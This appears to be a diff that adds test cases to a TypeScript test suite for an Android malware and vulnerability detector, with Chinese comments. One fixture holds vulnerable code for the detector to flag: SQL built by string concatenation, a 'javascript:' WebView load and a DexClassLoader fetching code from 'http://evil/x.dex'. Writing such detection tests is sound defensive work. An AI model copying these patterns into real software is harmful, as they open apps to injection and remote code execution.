@@ -244,6 +244,30 @@ const cases: Case[] = [
       return { hit: hits.some((h) => h.rule.crimer === "ransom-encrypt") && hits.some((h) => h.rule.crimer === "ransom-wipe"), detail: `命中 ${hits.length} 条（应含 勒索加密+擦除）` }
     },
   },
+  {
+    name: "②f 检测器命中(正——SQL/JS 注入/动态 DEX)",
+    run: async () => {
+      const dir = await makeSourceDir("class A { fun x() { db.execSQL(\"SELECT * FROM t WHERE id = \" + id); webView.loadUrl(\"javascript:\" + payload); DexClassLoader(\"http://evil/x.dex\", null, null, cl) } }")
+      const findings = await scanSourceDetectors(dir)
+      const codes = findings.map((f) => f.code)
+      return { hit: codes.includes("SOURCE_SQL_INJECTION_SRC") && codes.includes("SOURCE_JS_INJECTION_SRC") && codes.includes("SOURCE_DEX_EXEC_DYNAMIC"), detail: `命中 ${findings.length} 类（应含 SQL/JS 注入/动态 DEX）` }
+    },
+  },
+  {
+    name: "②f 检测器不命中(负——安全代码)",
+    run: async () => {
+      const dir = await makeSourceDir("class A { fun x() { db.rawQuery(\"SELECT * FROM t WHERE id = ?\", arrayOf(id)); webView.loadUrl(\"https://ok.example.com/page\") } }")
+      const findings = await scanSourceDetectors(dir)
+      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——参数化 SQL + HTTPS——安全）` }
+    },
+  },
+  {
+    name: "已有检测器抽查(正——行为静默安装规则)",
+    run: () => {
+      const hits = matchBehaviorRules(new Set(["android.content.pm.PackageInstaller.install"]))
+      return { hit: hits.some((h) => h.rule.crimer === "rogue-install"), detail: `命中 ${hits.length} 条（应含 静默安装——流氓推广）` }
+    },
+  },
 ]
 
 let failed = 0
